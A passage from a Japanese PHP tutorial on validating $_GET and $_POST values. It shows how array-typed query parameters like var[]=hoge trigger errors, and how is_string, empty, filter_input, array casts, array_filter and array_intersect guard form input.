<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">];</span>
    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$items</span><span class="p">[</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">]];</span>
    <span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'var'</span><span class="p">];</span>
<span class="p">}</span>
</pre></div>
</div>

<p>一見これで十分なように思えますが，エラーを完璧に潰すにはまだ不十分です．</p>

<p><code>http://example.com/test.php?var[]=hoge</code></p>

<p>正確にURLエンコードすれば</p>

<p><code>http://example.com/test.php?var%5B%5D=hoge</code></p>

<p>のようなクエリを受け取った時に， <code>$_GET['var']</code> は以下のような <strong>配列</strong> になってしまいます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="p">[</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'hoge'</span><span class="p">]</span>
</pre></div></div>

<p>故にこの例では上から順に</p>

<div class="code-frame" data-lang="txt">
<div class="code-lang"><span class="bold">エラー</span></div>
<div class="highlight"><pre><span></span>Notice:  Array to string conversion
Warning:  htmlspecialchars() expects parameter 1 to be string, array given
Warning:  Illegal offset type
Fatal error:  Unsupported operand types
</pre></div>
</div>

<p>のようなエラーが発生してしまいます．</p>

<ul>
<li>配列が <strong>E_NOTICE</strong> レベルのエラーを発生しながら文字列に強引に変換されたとき， <code>"Array"</code> という扱いになる．</li>
<li>入力値をそのままPHPの組み込み関数に渡している場合， <strong>E_WARNING</strong> レベルのエラーを発生してしまうケースが多い．</li>
<li>配列のオフセットにスカラー値または <code>NULL</code> 以外を指定したとき， <strong>E_WARNING</strong> レベルのエラーが発生する．</li>
<li>計算不可能なオペランド構成で <code>+</code> <code>-</code> などの演算子を使用したとき， <strong>E_ERROR</strong> レベルのエラーが発生する．</li>
</ul>

<p>こういった事態を防ぐためには，厳密に <strong>文字列であるかどうか</strong> もしくは <strong>配列でないかどうか</strong> をチェックする処理が必要です．先ほど述べたように，可能性は <strong>文字列</strong> と <strong>配列</strong> の2種類しかないので，以下のどちらのパターンを採用しても構いません．意味が分かりやすいと思ったほうを選んでください．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">文字列であることをチェックしたい場合</span></div>
<div class="highlight"><pre><span></span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
<span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">配列であることをチェックしたい場合</span></div>
<div class="highlight"><pre><span></span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
<span class="nb">is_array</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
</pre></div>
</div>

<p>ここでは <a href="http://www.php.net/manual/ja/function.is-string.php" rel="nofollow noopener" target="_blank">is_string</a> 関数の返り値の否定を用います．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが送信されていません'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが不正送信されました'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>「送信されていない」と「不正送信された」と「入力されていない」を区別する必要がない場合，以下のようにまとめてしまっても構いません．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>配列の場合は各要素ごとのチェックも必要です．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'params'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'params'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'パラメータが送信されていません'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"パラメータ</span><span class="si">{</span><span class="nv">$key</span><span class="si">}</span><span class="s2">が不正です"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="empty" class="fragment"></span><a href="#empty"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.empty.php" rel="nofollow noopener" target="_blank">empty</a>
</h2>

<p><a href="http://www.php.net/manual/ja/function.empty.php" rel="nofollow noopener" target="_blank">empty</a> は，変数が <strong>未定義である</strong> または <strong>型の相互変換により<code>false</code>と等しいと見なされる値である</strong> ことをエラーを発生させずにチェックすることが出来ます．つまり以下のセットはそれぞれ同じ意味となります．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">空と見なす場合</span></div>
<div class="highlight"><pre><span></span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$var</span> <span class="o">==</span> <span class="k">false</span>
<span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$var</span>
<span class="k">empty</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">空でないと見なす場合</span></div>
<div class="highlight"><pre><span></span><span class="nb">isset</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$var</span> <span class="o">==</span> <span class="k">true</span>
<span class="nb">isset</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$var</span>
<span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
</pre></div>
</div>

<p><code>""</code> は <code>false</code> と見なされる値の1つなので，最初の <a href="http://www.php.net/manual/ja/function.empty.php" rel="nofollow noopener" target="_blank">isset</a> だけを用いた例はこのように書くことも出来ます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>2番目に紹介した <a href="http://www.php.net/manual/ja/function.is-string.php" rel="nofollow noopener" target="_blank">is_string</a> 関数によるチェックも織り交ぜるなら以下のようになります．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>但し，<code>""</code> だけでなく <code>"0"</code> も <code>false</code> と見なされてしまい， <strong>「入力したのに入力していないと言われた」</strong> と利用者から文句が飛んでくるかもしれません．これぐらいの手抜きは場合によっては許されると思いますが，厳密な処理に拘る場合には避けるべきでしょう．著者はかなり気にします．</p>

<h1>
<span id="フィルタ関数の活用" class="fragment"></span><a href="#%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E9%96%A2%E6%95%B0%E3%81%AE%E6%B4%BB%E7%94%A8"><i class="fa fa-link"></i></a>フィルタ関数の活用</h1>

<p>ここからは</p>

<ol>
<li>スクリプトの先頭のほうで送信されてきた値をチェックする．有効なものであれば適当なローカル変数にその値を代入し， <strong>未定義</strong> もしくは <strong>想定外の型</strong> であれば <code>""</code> <code>NULL</code> <code>false</code> などを代入する．</li>
<li>そのローカル変数を用いて条件分岐を行い，適宜エラーに該当するかどうかをチェックする．</li>
</ol>

<p>という処理フローを想定して「1.」の部分のコードを提示します．こちらの方が全体的な見通しが良くなり，入力フォームを再表示するときの利便性も向上するからです．</p>

<h2>
<span id="文字列のみを許可する" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E3%81%BF%E3%82%92%E8%A8%B1%E5%8F%AF%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>文字列のみを許可する</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
<span class="p">}</span>
</pre></div></div>

<p><strong><a href="http://www.php.net/manual/ja/function.filter-input.php" rel="nofollow noopener" target="_blank">filter_input</a></strong> 関数を利用すれば，これと等価な処理をもっと美しく書くことが出来ます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">);</span>
</pre></div></div>

<p>文字列として送信されてきた場合のみ何か処理を行いたい場合は</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
    <span class="cm">/* 文字列として送信されてきた場合のみ実行したい処理 */</span>
<span class="p">}</span>
</pre></div></div>

<p>と書けば良いでしょう．</p>

<h2>
<span id="文字列を強制する" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E3%82%92%E5%BC%B7%E5%88%B6%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>文字列を強制する</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
<span class="p">}</span>
</pre></div></div>

<p>分岐パターンと代入先が1種類しかないので， <strong><a href="http://www.php.net/manual/ja/language.operators.comparison.php#language.operators.comparison.ternary" rel="nofollow noopener" target="_blank">三項演算子</a></strong> を利用することが出来ます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">&amp;&amp;を使う場合</span></div>
<div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">||を使う場合</span></div>
<div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">?</span> <span class="s1">''</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
</pre></div>
</div>

<p><a href="http://www.php.net/manual/ja/function.filter-input.php" rel="nofollow noopener" target="_blank">filter_input</a> 関数と文字列へのキャストを利用すれば，これらと等価な処理をもっと美しく書くことが出来ます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="1次元配列を強制する" class="fragment"></span><a href="#1%E6%AC%A1%E5%85%83%E9%85%8D%E5%88%97%E3%82%92%E5%BC%B7%E5%88%B6%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>1次元配列を強制する</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'items'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$items</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'items'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$items</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$items</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$items</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$items</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$items</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$items</span> <span class="o">=</span> <span class="p">[];</span>
<span class="p">}</span>
</pre></div></div>

<p><strong>配列へのキャスト</strong> と <strong><a href="http://www.php.net/manual/ja/function.array-filter.php" rel="nofollow noopener" target="_blank">array_filter</a></strong> 関数を利用すれば，これと等価な処理をもっと美しく書くことが出来ます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$items</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'items'</span><span class="p">])</span> <span class="o">?</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'items'</span><span class="p">]</span> <span class="o">:</span> <span class="p">[];</span>
<span class="nv">$items</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$items</span><span class="p">,</span> <span class="s1">'is_string'</span><span class="p">);</span>
</pre></div></div>

<p>配列から文字列への強引なキャストでは <strong>E_NOTICE</strong> レベルのエラーが発生してしまいますが，<ins>文字列から配列へのキャストではエラーが発生しません</ins>．キー <code>0</code> に対する値を1つ持つ配列としてエラー無しにキャストされます．</p>

<h2>
<span id="指定したキーに限定して1次元配列を強制する" class="fragment"></span><a href="#%E6%8C%87%E5%AE%9A%E3%81%97%E3%81%9F%E3%82%AD%E3%83%BC%E3%81%AB%E9%99%90%E5%AE%9A%E3%81%97%E3%81%A61%E6%AC%A1%E5%85%83%E9%85%8D%E5%88%97%E3%82%92%E5%BC%B7%E5%88%B6%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>指定したキーに限定して1次元配列を強制する</h2>

<h3>
<span id="テキストの配列を対象とする場合" class="fragment"></span><a href="#%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%81%AE%E9%85%8D%E5%88%97%E3%82%92%E5%AF%BE%E8%B1%A1%E3%81%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>テキストの配列を対象とする場合</h3>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
A: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"texts[a]"</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
B: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"texts[b]"</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
C: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"texts[c]"</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div></div>

<p>テキストボックスは<ins>入力内容が無くても空文字列として送信されます</ins>が，不正なリクエストに備えるには結局冗長に書かざるを得ません．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">([</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$texts</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span>
        <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'text'</span><span class="p">][</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'text'</span><span class="p">][</span><span class="nv">$i</span><span class="p">])</span> <span class="o">?</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'text'</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span> <span class="o">:</span>
        <span class="s1">''</span>
    <span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="チェックボックスの配列を対象とする場合" class="fragment"></span><a href="#%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%83%9C%E3%83%83%E3%82%AF%E3%82%B9%E3%81%AE%E9%85%8D%E5%88%97%E3%82%92%E5%AF%BE%E8%B1%A1%E3%81%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>チェックボックスの配列を対象とする場合</h3>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"checks[a]"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span><span class="p">&gt;</span>A<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"checks[b]"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span><span class="p">&gt;</span>B<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"checks[c]"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span><span class="p">&gt;</span>C<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div></div>

<p>チェックボックスに関しては，<ins>チェックしていないものは送信されません</ins>．また，今回のように値を実際には必要とせず，単純にチェックされたかされなかったかのみを判定したい場合は</p>

<ul>
<li>チェックされたもの → <code>true</code>
</li>
<li>チェックされなかったもの → <code>false</code>
</li>
</ul>

<p>として存在させておいた方が何かと扱いやすいと思います．これを実現するには以下のようにします．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">([</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$checks</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'checks'</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="指定した値に限定して1次元配列を強制する" class="fragment"></span><a href="#%E6%8C%87%E5%AE%9A%E3%81%97%E3%81%9F%E5%80%A4%E3%81%AB%E9%99%90%E5%AE%9A%E3%81%97%E3%81%A61%E6%AC%A1%E5%85%83%E9%85%8D%E5%88%97%E3%82%92%E5%BC%B7%E5%88%B6%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>指定した値に限定して1次元配列を強制する</h2>

<p>先ほどのチェックボックスの例に関して，今度はキーではなく値に着目し，想定されない値は含まないようにします．</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"checks[]"</span> <span class="na">value</span><span class="o">=</span><span class="s">"a"</span><span class="p">&gt;</span>A<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"checks[]"</span> <span class="na">value</span><span class="o">=</span><span class="s">"b"</span><span class="p">&gt;</span>B<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">name</span><span class="o">=</span><span class="s">"checks[]"</span> <span class="na">value</span><span class="o">=</span><span class="s">"c"</span><span class="p">&gt;</span>C<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div></div>

<p><strong><a href="http://www.php.net/manual/ja/function.array-intersect.php" rel="nofollow noopener" target="_blank">array_intersect</a></strong> 関数で値に注目したときの共通項を計算します． <code>0</code> から始まる数字添え字配列にした方が綺麗なので，必要に応じて最後に <strong><a href="http://www.php.net/manual/ja/function.array-values.php" rel="nofollow noopener" target="_blank">array_values</a></strong> 関数を通しておきます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$checks</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'checks'</span><span class="p">])</span> <span class="o">?</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'checks'</span><span class="p">]</span> <span class="o">:</span> <span class="p">[];</span>
<span class="nv">$checks</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nb">array_intersect</span><span class="p">(</span><span class="nv">$checks</span><span class="p">,</span> <span class="p">[</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">]));</span>
</pre></div></div>

<h1>
<span id="更なるステップアップ" class="fragment"></span><a href="#%E6%9B%B4%E3%81%AA%E3%82%8B%E3%82%B9%E3%83%86%E3%83%83%E3%83%97%E3%82%A2%E3%83%83%E3%83%97"><i class="fa fa-link"></i></a>更なるステップアップ</h1>

<h2>
<span id="可変変数-の利用" class="fragment"></span><a href="#%E5%8F%AF%E5%A4%89%E5%A4%89%E6%95%B0-%E3%81%AE%E5%88%A9%E7%94%A8"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/language.variables.variable.php" rel="nofollow noopener" target="_blank">可変変数</a> の利用</h2>

<p><a href="http://www.php.net/manual/ja/function.filter-input.php" rel="nofollow noopener" target="_blank">filter_input</a> 関数を利用するとかなりコードを短くできますが，それでも項目数だけ繰り返しコールする必要がありました．</p>

